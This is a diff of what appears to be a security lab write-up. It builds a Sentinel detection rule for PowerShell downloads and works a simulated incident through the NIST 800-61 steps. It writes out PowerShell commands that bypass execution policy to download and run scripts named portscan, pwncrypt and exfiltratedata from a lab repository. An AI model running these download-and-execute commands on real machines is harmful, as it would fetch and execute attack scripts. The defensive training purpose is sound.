@@ -54,7 +54,7 @@ DeviceProcessEvents
 | where ProcessCommandLine contains "Invoke-WebRequest"
 ```
 
-Verify payload detection. ✅
+Verify payload detection:
 
 ```kql
 let TargetHostname = "nessa-windows";
@@ -85,13 +85,13 @@ DeviceProcessEvents
 | where ProcessCommandLine contains "Invoke-WebRequest"
 ```
 
-3. **Frequency**: Every 4 hours
-   **Lookup Period**: Last 24 hours
-4. **Entity Mapping**:
+3. Set:
 
-   * `AccountName`, `DeviceName`, `ProcessCommandLine`
+   * **Frequency**: Every 4 hours
+   * **Lookup Period**: Last 24 hours
+4. **Entity Mapping**: `AccountName`, `DeviceName`, `ProcessCommandLine`
 5. **MITRE Tactic**: Command and Scripting Interpreter: PowerShell / Execution
-6. **Enable** and save the rule
+6. Enable and save the rule
 
 ![Sentinel Screenshot](https://github.com/user-attachments/assets/2c2e0d75-aa67-4ffc-a5ed-ffe30393d388)
 
@@ -99,47 +99,61 @@ DeviceProcessEvents
 
 ### 💣 Simulate Attack — Triggering the Alert
 
-In order to generate log activity that will trigger an Incident in Sentinel, I executed the following PowerShell command on the onboarded VM (`nessa-windows`) to simulate the attack:
+To generate log activity and trigger an alert in Sentinel, run the following PowerShell commands on the onboarded VM (`nessa-windows`):
 
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
 powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
 ```
+
+---
+
 ## 🛠️ Work the Incident (NIST 800-61 Lifecycle)
 
 ### 1️⃣ Preparation
 
-* Confirm access, tooling, training
+* Confirm access, tooling, and training are in place
 
 ### 2️⃣ Detection & Analysis
 
-* Assign incident and mark Active
+* Assign the incident and mark it **Active**
 * Investigate:
 
 ![Sentinel Screenshot](https://github.com/user-attachments/assets/7d589184-9fd1-479c-ba26-9a5adb092896)
 
-* Identify scripts:
+* Identify scripts and commands:
 
-  * `portscan.ps1`, `pwncrypt.ps1`, `eicar.ps1`, `exfiltratedata.ps1`
-  * `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`
-  *`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1`
-  *`powershell.exe" -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`
-  *`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
+*  Check PowerShell commands:
+     ```plaintext
+     powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
+     powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
+     powershell.exe" -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
+     powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
+     ```
+Scripts executed:
 
-* Gather evidence and validate intent (user or threat)
+* `portscan.ps1`
+* `pwncrypt.ps1`
+* `eicar.ps1`
+* `exfiltratedata.ps1`
+
+Gather evidence:
+
+* Scripts downloaded and executed 🧪.
+* User admitted to downloading free software during the events
 
 ### 3️⃣ Containment & Recovery
 
 * Isolate host using MDE
 * Run Defender scans
-* Remove malicious files, validate host state
+* Remove malicious files and validate system integrity
 
 ### 4️⃣ Post-Incident
 
-* Log scripts executed
-* Note involved user (`system-user`)
-* Update PowerShell usage policy
-* Enhance training
+* Log all scripts executed
+* Note user involved (`BigMomma`)
+* Update PowerShell usage policies
+* Provide staff security training
 * Mark incident **True Positive** and close
 
 ---
@@ -148,7 +162,7 @@ powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
 
 | **Metric**          | **Value**                                                         |
 | ------------------- | ----------------------------------------------------------------- |
-| Affected Device     | `windows-target-1`                                                |
+| Affected Device     | `nessa-windows`                                                |
 | Suspicious Commands | 4                                                                 |
 | Scripts Downloaded  | `portscan.ps1`, `pwncrypt.ps1`, `eicar.ps1`, `exfiltratedata.ps1` |
 | Incident Status     | Resolved                                                          |
